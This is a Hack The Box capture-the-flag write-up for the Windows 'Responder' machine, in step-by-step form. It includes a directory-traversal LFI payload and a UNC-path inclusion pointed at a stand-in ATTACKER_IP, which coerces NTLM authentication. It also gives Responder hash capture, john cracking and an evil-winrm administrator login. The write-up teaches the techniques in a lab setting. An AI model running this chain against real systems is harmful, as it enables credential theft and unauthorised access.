---
title: Responder
tags:
  - Windows
  - Very Easy
  - Starting Point
---

# Responder — Hack The Box (Starting Point · Tier 1)

**OS:** Windows · **Difficulty:** Very Easy

## Summary
Responder is a Windows host serving a PHP web application (on the vhost `unika.htb`) that includes pages through a user-controlled `page` parameter, making it vulnerable to file inclusion. By pointing that parameter at an attacker-controlled SMB/UNC path, the server is forced to authenticate outbound, leaking a NetNTLMv2 hash that can be captured with Responder, cracked offline, and reused over WinRM to obtain an administrative shell.

## Concepts & tools

| Phase | Tools / techniques |
|---|---|
| Reconnaissance | `ping`, `nmap`, `whatweb` |
| Enumeration | browser, manual parameter analysis, vhost mapping via `/etc/hosts` |
| Exploitation | Local File Inclusion (LFI), SMB auth coercion via UNC path, `Responder` |
| Credential cracking | `john` (NetNTLMv2, rockyou wordlist) |
| Remote access | `evil-winrm` (WinRM, 5985/tcp) |

## 1. Enumeration

Confirm the host is up and fingerprint the web port:

```bash
ping 10.129.x.x

# Full TCP port sweep — a web port alone never tells the whole story
nmap -Pn -p- --min-rate=1000 10.129.x.x

# Targeted service/version detection + default scripts on the open ports
nmap -Pn -sCV -p 80,5985 10.129.x.x

whatweb http://10.129.x.x
```

- `-Pn` skips host discovery, since HTB targets often don't answer ICMP reliably over the VPN.
- The full sweep (`-p-`) is the step that matters here: it reports **80/tcp (HTTP)** and **5985/tcp (WinRM)** open. Scanning only the obvious web port would silently miss 5985 — the exact port the foothold relies on later. Always enumerate the full range before narrowing down.
- The second scan runs version detection and default scripts (`-sCV`) on just those ports: `nmap` identifies 5985 as **WinRM** (Microsoft HTTPAPI / `wsman`), which confirms remote-management access is available.
- `whatweb` fingerprints the stack as **Apache on Windows**, a **PHP** backend, and a redirect to **`unika.htb`**.

Because the app redirects to a hostname, browsing by raw IP renders incorrectly. Map the vhost so the browser and tools resolve it:

```bash
echo "10.129.x.x  unika.htb" | sudo tee -a /etc/hosts
```

After this, `http://unika.htb/` loads normally.

Exploring the language selector shows content loaded dynamically:

```
http://unika.htb/index.php?page=english.html
```

A `page` parameter that swaps in files strongly suggests a backend like:

```php
include($_GET['page']);
```

— the classic shape of a file inclusion vulnerability.

## 2. Foothold / Exploitation

### 2.1 Confirm the inclusion (LFI)

Request a known Windows file through the parameter using directory traversal:

```
http://unika.htb/index.php?page=../../../../../../windows/system32/drivers/etc/hosts
```

Getting the file's contents back confirms the server will include arbitrary local paths.

### 2.2 Coerce SMB authentication (NTLM capture)

On Windows, PHP resolves a UNC path (`\\host\share`) as a **local** path, so this works even with `allow_url_include` disabled — unlike classic `http://` RFI, which would need it. Pointing `page` at your own machine forces the server to open an SMB session back to you:

```
http://unika.htb/index.php?page=//ATTACKER_IP/test
```

Start Responder first on the VPN interface to catch that authentication:

```bash
sudo responder -I tun0
```

When the request fires, Responder records a **NetNTLMv2** hash for the account the web service runs as.

### 2.3 Crack the hash offline

Save the captured hash to a file and run it against rockyou (gzipped on Kali, so decompress it the first time):

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz        # first time only
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

John auto-detects the `netntlmv2` format. The password cracks successfully (`<REDACTED>`).

### 2.4 Remote shell over WinRM

The cracked credentials belong to the **Administrator** account, and WinRM (5985/tcp) is open, so authenticate directly:

```bash
evil-winrm -i <TARGET_IP> -u Administrator -p '<REDACTED>'
```

This drops an administrative PowerShell session on the host.

## 3. Privilege Escalation

Not applicable. The captured and cracked account is already **Administrator**, so the WinRM session is privileged from the start — no escalation step is required. (A flag stored under another user's profile, e.g. `C:\Users\mike\Desktop\`, is still readable precisely because Administrator can access any user profile.)

## Flag

`flag.txt` on the target. Value omitted, per Hack The Box's publishing rules.

## Lessons learned
- On Windows, a file-inclusion bug isn't just "read a file": a UNC path coerces the server into authenticating to **me**, and the resulting NetNTLMv2 hash is crackable offline.
- The `Responder` → `john` → `evil-winrm` chain finally clicked end to end — capture, crack, log in.
- NTLM feels harmless until an attacker gets to choose *where* a server authenticates.
- Mapping the vhost in `/etc/hosts` is a required step, not a detail — the app simply doesn't behave correctly over a raw IP.
- Enumerate the **full** port range first: WinRM (5985) only shows up on a `-p-` scan, and it's the port that closes out the box.
